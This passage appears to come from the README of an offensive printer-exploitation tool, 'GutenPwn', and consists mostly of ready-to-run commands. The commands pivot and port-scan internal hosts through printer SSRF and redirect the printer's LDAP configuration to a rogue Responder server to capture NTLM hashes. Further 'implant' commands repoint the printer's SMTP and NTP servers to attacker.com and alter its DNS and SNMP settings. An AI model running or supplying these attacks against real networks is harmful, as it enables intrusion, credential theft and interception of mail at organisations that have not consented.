...
python gpwn.py 192.168.1.100 --pivot

# Port-scan a specific internal host via printer SSRF
python gpwn.py 192.168.1.100 --pivot-scan 10.0.0.1
python gpwn.py 192.168.1.100 --pivot-scan 192.168.1.1
python gpwn.py 192.168.1.100 --pivot-scan 172.16.0.10
```

**How it works:**
1. GutenPwn sends an IPP `Print-Job` request with the job URI pointing to an internal IP (e.g. `ipp://10.0.0.1/ipp`)
...
```bash
python gpwn.py 192.168.1.100 --network-map
```
...
Many enterprise printers are configured to authenticate against Active Directory via LDAP for scan-to-email and address book lookups. GutenPwn exploits this by redirecting the printer's LDAP server configuration to a rogue LDAP server (Responder), capturing the machine account NTLM hash.

```bash
# Step 1 — Check if printer has LDAP integration configured
python gpwn.py 192.168.1.100 --xpl-check research-ldap-hash-capture
...
python gpwn.py 192.168.1.100 --xpl-run research-ldap-hash-capture

# Step 4 — Live: redirect to rogue LDAP server
python gpwn.py 192.168.1.100 --xpl-run research-ldap-hash-capture --no-dry
...
python gpwn.py 192.168.1.100 --implant smtp_host=attacker.com

# Change DNS server
python gpwn.py 192.168.1.100 --implant dns=8.8.8.8

# Change SNMP community string
python gpwn.py 192.168.1.100 --implant snmp_community=hacked

# Change NTP server (time-based attacks)
python gpwn.py 192.168.1.100 --implant ntp=attacker.com
```
